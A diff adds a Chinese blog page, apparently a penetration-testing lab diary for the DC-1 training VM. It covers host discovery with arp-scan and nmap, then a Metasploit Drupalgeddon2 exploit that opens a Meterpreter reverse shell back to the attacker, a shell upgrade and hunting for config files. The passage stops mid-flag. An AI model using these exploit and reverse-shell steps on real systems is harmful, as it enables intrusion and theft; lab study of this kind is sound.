@@ -1,0 +1,856 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="梧桐虽立，其心以空，待发于春，实葬于冬" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="梧桐虽立，其心以空，待发于春，实葬于冬" type="application/atom+xml"><link rel="alternate" type="application/json" title="梧桐虽立，其心以空，待发于春，实葬于冬" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / AI安全 / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title></title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><style>.zlaryy-view-item{white-space:nowrap}.zlaryy-pageview-count{margin-inline-start:4px}.segments article.item>.info>.meta{display:flex;flex-wrap:wrap;column-gap:.65rem;row-gap:.2rem}.segments article.item>.info>.meta>.item{margin:0}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline"></h1><div class="meta"><span class="item" title="创建时间：2026-10-13 18:22:43"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-10-13T18:22:43+08:00">2026-10-13</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>13k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>11 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / AI安全 / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="梧桐虽立，其心以空，待发于春，实葬于冬"/></span><div class="body md" itemprop="articleBody"><h1 id="dc-1靶场日记"><a class="anchor" href="#dc-1靶场日记">#</a> DC-1靶场日记</h1>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_88307848/article/details/152442104">DC-1靶场搭建及渗透实战 超详细 过程-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/14038071.html">(Ő∀Ő3)ノ骗你的嘿嘿！</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/627481798">DC-1靶场搭建和学习记录 - 知乎</a></p>
+<p>搭建过程在参考文章中给出了，我们直接快进到渗透过程</p>
+<h1 id="寻找靶机ip"><a class="anchor" href="#寻找靶机ip">#</a> 寻找靶机IP</h1>
+<p>我们成功开启了虚拟机，但是我们还需要知道靶机的IP地址，探测主机的工具有很多，最常见的有<code>arp-scan</code>、<code>nmap</code>、<code>netdiscover</code></p>
+<h2 id="arp-scan"><a class="anchor" href="#arp-scan">#</a> arp-scan</h2>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>sudo arp-scan -l</span></span></code></pre>
+<p><code>arp-scan</code>：发送<strong>ARP请求</strong>，把收到的响应显示出来（ARP（Address Resolution Protocol，地址解析协议）请求：局域网中用来通过IP地址查找对应MAC地址的一种广播询问）</p>
+<p><code>-l</code>：是<code>--localnet</code>的简写，根据所选网卡的IPv4地址和子网掩码，自动确定要扫描的本地网段</p>
+<p>通过大量的ARP请求，然后就可以根据哪些主机返回了ARP应答，就能快速列出局域网内的存活主机、IP和MAC地址</p>
+<p>我们可以在开启靶场的虚拟机设置里面找到MAC地址：</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/1.png" class=""></p>
+<p>执行完arp请求之后我们可以看到类似如下界面的结果：</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/2.png" class=""></p>
+<p>根据对应的MAC地址，我们不难发现靶机IP为<code>192.168.152.129</code></p>
+<h2 id="nmap"><a class="anchor" href="#nmap">#</a> nmap</h2>
+<p>由于攻击机和靶机处在同一个局域网/子网里面，所以首先我们需要通过<code>ifconfig</code>命令获取攻击机直接连接的网段，扫描这个网段就可以覆盖靶机最可能出现的范围</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>ifconfig</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/3.png" class=""></p>
+<p>我们重点关注<code>eth0</code>里面的<code>inet</code>、<code>netmask</code>、<code>broadcast</code>三个字段，这里的<code>eth0</code>是Kali的网络接口，<code>lo</code>是本机回环接口</p>
+<ul>
+<li><code>inet</code>：Kali自己的IPv4地址</li>
+<li><code>netmask</code>：子网掩码</li>
+<li><code>broadcast</code>：广播地址</li>
+</ul>
+<p>从图中我们可以得到我的Kali的IP为<code>192.168.152.128</code>，子网掩码是<code>255.255.255.0</code></p>
+<p>IPv4地址一共有32位，分成四组，每组八位，子网掩码决定哪些位属于网络部分，哪些属于主机部分，<code>255.255.255.0</code>转换为二进制为<code>11111111.11111111.11111111.00000000</code>，其中1表示网络位，0表示主机位</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/4.png" class=""></p>
+<p>​                                                                  <em>该图片由ChatGPT生成</em></p>
+<p>因此网络位总共有24位，而主机位总共有8位</p>
+<p><strong>网络地址</strong>用于标识一个子网，而不是某一台具体的计算机，我这里的网络地址为<code>192.168.152.0</code>（因为在<code>/24</code>这个网段中，当所有的主机位都为0时，得到的就是网络地址）</p>
+<p>那么这里是怎么得出来的<code>/24</code>呢？</p>
+<p><code>/24</code>是根据子网掩码<code>255.255.255.0</code>得出来的，关键在于子网掩码转换为二进制之后，有多少个连续的1就是<code>/</code>后面的数字，同理可得：</p>
+<table>
+<thead>
+<tr>
+<th>子网掩码</th>
+<th>二进制中1的数量</th>
+<th>CIDR写法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>255.0.0.0</td>
+<td>8</td>
+<td>/8</td>
+</tr>
+<tr>
+<td>255.255.0.0</td>
+<td>16</td>
+<td>/16</td>
+</tr>
+<tr>
+<td>255.255.255.0</td>
+<td>24</td>
+<td>/24</td>
+</tr>
+<tr>
+<td>255.255.255.128</td>
+<td>25</td>
+<td>/25</td>
+</tr>
+<tr>
+<td>255.255.255.192</td>
+<td>26</td>
+<td>/26</td>
+</tr>
+<tr>
+<td>255.255.255.240</td>
+<td>28</td>
+<td>/28</td>
+</tr>
+</tbody>
+</table>
+<p>我们在之前提到<code>/</code>后面的数字代表了有多少个主机位，其中八个主机位，每一位都可以是0或1，所以总共有[ \underbrace{2\times2\times2\times2\times2\times2\times2\times2}_{8\text{ 个二进制位}} =2^8=256 ]，256个不同组合，在常见的<code>/24</code>子网中，需要保留两个特殊地址，其中<code>192.168.152.0</code>为网络地址，<code>192.168.152.255</code>为广播地址，最后得到可用主机地址数为254个，范围为<code>192.168.152.1~192.168.152.254</code></p>
+<p>什么是<strong>广播地址</strong>呢？</p>
+<p>广播地址用于向同一个IPv4子网中的所有设备发送广播数据</p>
+<ul>
+<li>
+<p>广播：假设在VMWare中搭建了如下网络</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/5.png" class=""></p>
+<p>现在假设Kali想发送网络数据，有常见的两种情况：</p>
+<ul>
+<li>
+<p>单播（Unicast）：Kali只想给DC-1发送数据：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>源IP：192.168.214.128</span></span>
+<span class="line"><span>目标IP：192.168.214.130</span></span></code></pre>
+<p>类似于给某个人单独发送一条消息</p>
+</li>
+<li>
+<p>广播（Broadcast）：Kali想给同一个局域网中的所有设备发送一条消息</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>源IP：192.168.214.128</span></span>
+<span class="line"><span>目标IP：192.168.214.255</span></span></code></pre>
+<p>类似于在包含所有广播可达地址的群聊里面发送消息让所有成员都能收到</p>
+</li>
+</ul>
+</li>
+<li>
+<p>广播域（Broadcast Domain）：一个广播数据帧能够到达的网络范围，例如：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>网络A：192.168.214,0/24</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>kali：192.168.214.128</span></span>
+<span class="line"><span>DC-1:192.168.214.130</span></span>
+<span class="line"><span>设备B：192.168.214.131</span></span></code></pre>
+<p>如果这三台设备连接在同一个普通二层虚拟网络中，那么Kali发出的以太网广播帧通常能到达另外两台设备，假设还有一个网络：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>网络B：192.168.100.0/24</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>设备D：192.168.100.10</span></span></code></pre>
+<p>设备D位于另一个由路由器隔开的网络，那么Kali的普通广播不会自动传过去，因为路由器默认不会转发这种广播到其他子网</p>
+<p>广播域是根据二层网络连接和VLAN等因素划分的，并不完全由IP网段决定，两个设备的IP在同一个<code>/24</code>网段，不代表他们一定处于同一个广播域</p>
+</li>
+</ul>
+<p>接下来就是用nmap进行主机实现了：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>nmap -sv 192.168.152.0/24</span></span></code></pre>
+<p>在理解Nmap为什么能利用ARP发现靶机之前，我们先理解ARP为什么需要广播</p>
+<p>假设VMware虚拟网络中有两台虚拟机</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/6.png" class=""></p>
+<p>Kali想给DC-1发送数据<code>目标IP：192.168.2144.130</code>（假设主机位为130），这里存在一个问题是：在常见的以太网局域网中，发送IP数据包时，需要把它封装在以太网帧中，而以太网帧需要填写目标IP的MAC地址，可以简记为IP地址用于标识网络中的设备以及跨网络寻址，MAC地址用于当前以太网链路中传递数据帧</p>
+<p>但是现在Kali只知道DC-1的IP，却不知道MAC地址，这时候就需要ARP（Address Resolution Protocol地址解析协议），它主要用于在IPv4局域网中解析IP地址对应的MAC地址</p>
+<p><strong>ARP请求为什么需要广播</strong>：发送ARP请求时，Kali目前并不知道这个MAC地址，它无法直接向DC-1单播发送以太网帧，常见以太网环境中数据大致是这样封装的：</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/8.png" class=""></p>
+<p>因为单播需要知道目标MAC，所以这个ARP请求会通过以太网广播发送：</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/7.png" class=""></p>
+<p>广播帧的MAC地址为<code>FF:FF:FF:FF:FF:FF</code>，该地址表示将帧广播给当前二层广播域内的设备，DC-1发现<code>192.168.214.130</code>是自己的IP，于是回复，其他设备发现请求的IP不是自己的，通常不回复，因此广播的作用就是让Kali在不知道目标MAC地址的情况下找到拥有指定IPv4地址的设备</p>
+<p>由于DC-1收到的ARP请求中已经包含Kali的IP地址和MAC地址，所以DC-1知道应该把回复发送给谁，也就不需要再次广播，这个APR回复通常采用单播</p>
+<p>Nmap所做的事情其实是<strong>针对一个网段中的多个IP地址发送ARP请求，然后根据收到的回复判断哪些地址有主机在使用</strong>，例如<code>nmap -sn 192.168.152.0/24</code>，Nmap可能分别发送这样的ARP请求：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Who has 192.168.214.1?</span></span>
+<span class="line"><span>Who has 192.168.214.2?</span></span>
+<span class="line"><span>Who has 192.168.214.3?</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>Who has 192.168.214.130?</span></span></code></pre>
+<p>Nmap收到对应的ARP回复之后就有证据判断回复IP对应的主机在当前网络中处于活动状态</p>
+<p>接下来我们只需要对比DC-1靶场的MAC地址就可以找到对应的靶机IP</p>
+<h2 id="探测目标靶机ip的开放端口"><a class="anchor" href="#探测目标靶机ip的开放端口">#</a> 探测目标靶机IP的开放端口</h2>
+<p>还是使用nmap来做探测</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>nmap -sV -p- 192.158.152.129</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/9.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>-sS：TCP SYN扫描（只检测端口状态）</span></span>
+<span class="line"><span>-sV：版本检测（检测端口状态+服务版本）</span></span>
+<span class="line"><span>-A：全面扫描（包含版本检测+OS检测+脚本扫描）</span></span>
+<span class="line"><span>-p-：扫描全部端口0~65535</span></span></code></pre>
+<p>可以看到80端口是http协议，而我们的虚拟机是NAT模式，那么我们可以使用浏览器访问</p>
+<h1 id="网页信息搜集"><a class="anchor" href="#网页信息搜集">#</a> 网页信息搜集</h1>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/10.png" class=""></p>
+<p>通过Wappalyzer插件可以很直观地看到Drupal为CMS，也可以通过whatweb：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>whatweb -v 192.168.152.129</span></span>
+<span class="line"><span>whatweb http://192.168.152.129</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/11.png" class=""></p>
+<h1 id="攻击drupal"><a class="anchor" href="#攻击drupal">#</a> 攻击Drupal</h1>
+<p>接下来我们可以使用工具metasploit查找漏洞（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），它的主要用途包括搜索与选择模块，配置攻击参数，执行漏洞利用，管理会话</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>msfconsole</span></span>
+<span class="line"><span>search Drupal</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/12.png" class=""></p>
+<p>可以选择等级最高的漏洞模块并且时间最新，也就是图中的2018年的漏洞</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 使用漏洞模块编号</span></span>
+<span class="line"><span>use 1</span></span>
+<span class="line"><span># 使用漏洞名称</span></span>
+<span class="line"><span>use exploit/unix/webapp/drupal_drupalgeddon2</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/13.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span></span></code></pre>
+<p>系统提示还没有选择攻击载荷（payload），因此自动选择默认的<code>php/meterpreter/reverse_tcp</code>（php Meterpreter连接），这是因为Drupal是一个web应用，漏洞执行的是php代码</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>msf exploit(unix/webapp/drupal_drupalgedden2) ></span></span></code></pre>
+<p>成功进入Drupalgeddon2漏洞利用模块（CVE-2018-7600，著名的Drupal远程代码执行漏洞）</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查看需要配置哪些参数</span></span>
+<span class="line"><span>show options</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/14.png" class=""></p>
+<p><code>Current Setting</code>是目前设置的内容，Required表示是否需要设置内容，yes为必须设置，no可以设置也可以不设置</p>
+<p>重点关注Required（是否为必须）为yes的项：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>RHOSTS：当前为空，需要设置为目标靶机的IP地址（Current Setting）</span></span>
+<span class="line"><span>RPORT：当前为80，代表目标web服务的端口，如果对方开启了8080或其他端口则需要修改</span></span>
+<span class="line"><span>TARGETURI：当前为/，代表Drupal站点的安装路径，如果Drupal装在/drupal/目录下，这里就必须改为/drupal/</span></span>
+<span class="line"><span>PHP_FUNC：设置为passthru，这是漏洞利用时用来执行系统命令的php函数</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>VHOST/SSL/Proxies：这些是可选的高级选项，通常保持默认即可（除非目标绑定了特定的域名或者需要走代理）</span></span></code></pre>
+<p><code>Payload options</code>（载荷选项）：这一部分是在成功利用漏洞之后，让目标机器回连到电脑的配置，由于我们用的是反向连接（reverse_tcp），所以需要配置自己电脑的监听地址：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>LHOST：当前设置是192.168.152.128，为我的Kali（攻击机）机器的IP地址，要确保这个IP是靶机可以访问到的（比如在同一个内网，或者通过公网IP/VPS）</span></span>
+<span class="line"><span>LPORT：当前为4444，为我的本地监听的端口，只要不被占用保持默认也行</span></span></code></pre>
+<p><code>Exploit target</code>（利用目标）：这里只有一个选项<code>0 Automatic (PHP In-Memory)</code>，表示自动利用，并将PHP Payload直接在内存中执行</p>
+<p>解释完接下来我们回到攻击流程，由于缺少RHOSTS，所以我们需要设置：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>set RHOSTS 192.168.152.129</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 检查是否成功</span></span>
+<span class="line"><span>show options</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/15.png" class=""></p>
+<p>配置成功之后我们就可以执行<code>run</code>开始攻击了</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/16.png" class=""></p>
+<ul>
+<li><code>Started reverse TCP handler on 192.168.152.128:4444</code>：攻击机在本地4444端口开启了监听，等待目标机器主动连接回来（反向shell）</li>
+<li><code>Running automatic check ...</code>：模块正在自动检测目标是否存在漏洞</li>
+<li><code>[!] The service is running, but could not be validated</code>：提示目标web服务正在运行，但自动检测无法确切验证漏洞是否存在，这在Drupalgeddon2中很常见，很多情况下自动检查会失败（因为版本或配置差异），但不影响实际的攻击</li>
+<li><code>Sending stage (40004 bytes) to 192.168.152.129</code>：漏洞利用成功执行，攻击机正在向目标机器发送Meterpreter的载荷代码（Stage）</li>
+<li><code>Meterpreter session 1 opened (192,.168.152.128:4444 -&gt; 192.168.152.129:39472) at ...</code>：这代表目标机器成功执行了载荷，并且主动连接回了4444端口
+<ul>
+<li><code>Meterpreter session 1</code>：表示成功建立了一个会话，编号为1</li>
+<li><code>192.168.152.129:39427</code>：目标机器随机分配的端口号</li>
+</ul>
+</li>
+</ul>
+<p>现在我们已经拿到了目标机器的控制权限，在当前msf的提示符下，可以输入以下命令来实现操作会话</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查看当前所有会话</span></span>
+<span class="line"><span>session -l</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 进入（交互）会话1</span></span>
+<span class="line"><span>session -i 1</span></span></code></pre>
+<p>进入Meterpreter会话之后，常用的基础命令如下：</p>
+<ul>
+<li><code>sysinfo</code>：查看目标系统信息（操作系统、主机名、架构等）</li>
+<li><code>getuid</code>：查看当前获取到的权限（如<code>www-data</code>）</li>
+<li><code>shell</code>：进入目标系统的标准命令行Shell，通常是Linux Bash</li>
+<li><code>background</code>：将当前的会话挂起到后台（返回msf主界面，方便进行其他操作）</li>
+<li><code>hashdump</code>（需要高权限）：尝试抓取系统密码哈希</li>
+<li><code>ls / pwd / cd</code>：浏览目标机器文件系统</li>
+</ul>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/17.png" class=""></p>
+<p>既然刚才提到了<code>shell</code>才能进入靶机标准命令行，我们现在所处的环境是什么呢？</p>
+<p>当前所处环境是一个<code>Meterpreter</code>会话，为Metasploit专门提供的内存后渗透工具（Meterpreter）环境，它是刚才发送过去的Payload（<code>php/meterpreter/reverse_tcp</code>）在目标机器内存中成功执行后建立的，运行在靶机的内存中（<code>PHP In-Memory</code>），它没有在硬盘上留下明显的二进制文件，隐蔽性很强，这里我们输入的<code>ls</code>是Meterpreter自带的命令，而不是Linux，通过Meterpreter的API调用目标系统的底层功能来列出文件</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/18.png" class=""></p>
+<p>这样我们就拿到了第一个flag：<code>Every good CMS needs a config file - and so do you.</code>，提示我们需要找配置文件</p>
+<p>在许多参考文章中都提到了可以用python pty模块升级为交互式shell（前提是受害机有python和获得一个反向shell），可以变得更加简洁美观：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>python -c 'import pty;pty.spawn("/bin/bash")'</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/19.png" class=""></p>
+<p>接下来我们尝试用<code>find</code>命令查找文件：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查找名字里带有flag的文件（这里需要root权限才能查找到其他目录下的文件）</span></span>
+<span class="line"><span>find / -name flag*</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 查找配置文件</span></span>
+<span class="line"><span>find / -name settings.php</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/20.png" class=""></p>
+<p>由于CMS的配置文件位置和命名方式都不太一样，所以需要搜索一下，查找Drupal的配置文件位置的配置文件名（<code>sites/default/files</code>）</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/21.png" class=""></p>
+<p>接下来我们使用<code>cat settings.php</code>查看文件内容</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/22.png" class=""></p>
+<p>看到了flag2：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/**</span></span>
+<span class="line"><span> *</span></span>
+<span class="line"><span> * flag2</span></span>
+<span class="line"><span> * Brute force and dictionary attacks aren't the</span></span>
